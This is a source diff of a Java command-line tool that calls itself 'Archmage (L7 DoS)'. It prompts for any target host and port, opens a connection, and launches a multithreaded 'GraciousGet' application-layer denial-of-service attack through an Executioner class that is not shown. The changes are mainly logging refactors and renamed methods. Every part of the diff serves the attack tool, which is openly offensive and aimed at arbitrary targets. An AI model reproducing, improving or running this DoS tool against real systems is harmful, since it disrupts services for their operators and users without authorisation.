@@ -6,12 +6,15 @@ import java.net.Socket;
 import java.net.UnknownHostException;
 import java.util.Scanner;
 
+import m3rlin.utils.Logger;
+
 public class Archmage {
 
 	private static final String STOP_ATTACK = "STOP";
 	private static final String EXIT_ARCHMAGE = "EXIT";
 
-	Executioner executioner;	
+	Executioner executioner;
+	
 	private Socket socket;
 	private Scanner console;
 	private String host;
@@ -20,10 +23,10 @@ public class Archmage {
 	public void start() {
 		try {				
 			console = new Scanner(System.in);
-			System.out.println("\n>> Attempting connection to " + host + ":" + port + "...");
+			Logger.console("\n>> Establishing connection to " + host + ":" + port + "...");
 			socket = new Socket(host, port);
-			System.out.println(">> Established connection to " + host + ":" + port + "...");
-			System.out.println(">> Begninning GraciousGet attack...\n");
+			Logger.console("\n>> Connection established...");
+			Logger.console("\n>> Begninning GraciousGet attack...\n\n");
 			executioner = new Executioner(host, port);
 			executioner.start();
 			while (executioner.isRunning()) {
@@ -36,44 +39,43 @@ public class Archmage {
 							exit();
 						}
 					} else {
-						System.out.print("Attack threads: " + executioner.getActiveCount());
+						Logger.info("Attack threads: " + executioner.getActiveCount());
+						Logger.info("Completed threads: " + executioner.getCompletedTaskCount());
 					}
 				}
 			}
-			getHostInfo();
-			start();
 		} catch (UnknownHostException e) {			
-			System.out.println(">> Could not locate the host; try another, or check again later (UnknownHostException)");			
+			Logger.console("\n>> Could not locate the host; try another, or check again later (UnknownHostException)\n");			
 		} catch (ConnectException e) {		
-			System.out.println(">> Could not connect to the socket address; try another port, or start checking for firewall issues (ConnectException)");			
+			Logger.console("\n>> Could not connect to the socket address; try another port, or start checking for firewall issues (ConnectException)\n");			
 		} catch (IllegalArgumentException e) {			
-			System.out.println(">> Port out of range; try another (IllegalArgumentException)");
+			Logger.console("\n>> Port out of range; try another (IllegalArgumentException)\n");
 		} catch (IOException e) {
-			System.out.println(">> Badness while acquiring socket connection (IOException)");
-			e.printStackTrace();
+			Logger.console("\n>> Badness while acquiring socket connection (IOException)\n");
 		}
+		init();
+		start();
 	}
 	
 	public void stop() throws IOException {
-		System.out.println(">> Stopping attack...");
+		Logger.console("\n>> Stopping attack...");
 		executioner.stop();
 		socket.close();
+		Logger.console("\n>> Attack stopped...\n");
 	}
 	
 	public void exit() throws IOException {
-		System.out.println("\n>> Stopping attack, exiting...");
-		executioner.stop();
-		console.close();
-		socket.close();
+		stop();
+		Logger.console("\n>> Exiting...");
 		System.exit(0);
 	}
 	
-	public void getHostInfo() {
+	public void init() {
 		console = new Scanner(System.in);
-		System.out.print("\nEnter target (IP or host): ");
+		Logger.console("\nEnter target (IP or host): ");
 		host = console.nextLine();
 		try {
-			System.out.print("Enter port (Default: 80): ");
+			Logger.console("Enter port (Default: 80): ");
 			String portStr = console.nextLine();
 			if (portStr == null || portStr.length() == 0) {
 				port = 80;
@@ -81,19 +83,19 @@ public class Archmage {
 				port = Integer.parseInt(portStr);
 			}
 		} catch (NumberFormatException e) {		
-			System.out.println("\n>> Port numbers can't contain non-numeric characters");
-			getHostInfo();
+			Logger.console("\n>> Port numbers can't contain non-numeric characters\n");
+			init();
 		}		
 	}
 	
 	public static void main(String[] args) {
-		System.out.println("+-------------------+");
-		System.out.println("| Archmage (L7 DoS) |");
-		System.out.println("+-------------------+");
+		Logger.console("+-------------------+\n");
+		Logger.console("| Archmage (L7 DoS) |\n");
+		Logger.console("+-------------------+\n");
 		Archmage archmage;
 		while (true) {
 			archmage = new Archmage();
-			archmage.getHostInfo();
+			archmage.init();
 			archmage.start();	
 		}
 	}
